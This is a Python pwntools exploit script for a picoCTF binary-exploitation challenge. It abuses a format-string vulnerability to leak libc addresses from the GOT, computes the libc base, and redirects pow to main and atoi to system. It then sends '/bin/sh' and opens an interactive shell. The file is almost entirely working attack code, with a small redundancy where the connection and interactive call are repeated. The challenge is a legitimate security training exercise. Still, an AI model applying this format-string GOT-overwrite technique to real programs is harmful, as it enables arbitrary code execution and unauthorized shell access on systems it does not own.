#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mars.picoctf.net --port 31929 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'mars.picoctf.net'
port = int(args.PORT or 31929)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

def send_payload(io, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    io.sendlineafter("A: ", a)
    io.sendlineafter("B: ", b)

def send_format(io, format, values):
    format_prefix = b'111_'
    values_prefix = b'1111111_'
    send_payload(io, format_prefix + format, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./libc6_2.31-0ubuntu9.1_amd64.so")

io = start()

log.info(f"puts() GOT address: {hex(exe.got['puts'])}")
log.info(f"atoi() GOT address: {hex(exe.got['atoi'])}")

fmt_first_offset = 43

loop_main_fmt, loop_main_address = fmtstr_split(fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten = 0x25)
io = start()
output = send_format(io, f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode("ascii") + loop_main_fmt, p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address)
puts_addr_str, atoi_addr_str, *rest = output.split(b".")
puts_addr = int.from_bytes(puts_addr_str, "little") 
log.info(f"puts() runtime address: {hex(puts_addr)}")
atoi_addr = int.from_bytes(atoi_addr_str, "little") 
log.info(f"atoi() runtime address: {hex(atoi_addr)}")


libc.address = puts_addr - libc.symbols["puts"]
assert(libc.address & 0xFFF == 0)

log.info(f"LibC base address: {hex(libc.address)}")

atoi_to_system_fmt, atoi_to_system_address = fmtstr_split(fmt_first_offset, {exe.got["atoi"]: libc.symbols["system"]}, numbwritten = 0x17)
log.info(b"Payload1: " + atoi_to_system_fmt)
log.info(b"Payload2: " + atoi_to_system_address)
send_format(io, atoi_to_system_fmt, atoi_to_system_address)

send_payload(io, "/bin/sh", "dummy")

io.interactive()

io.interactive()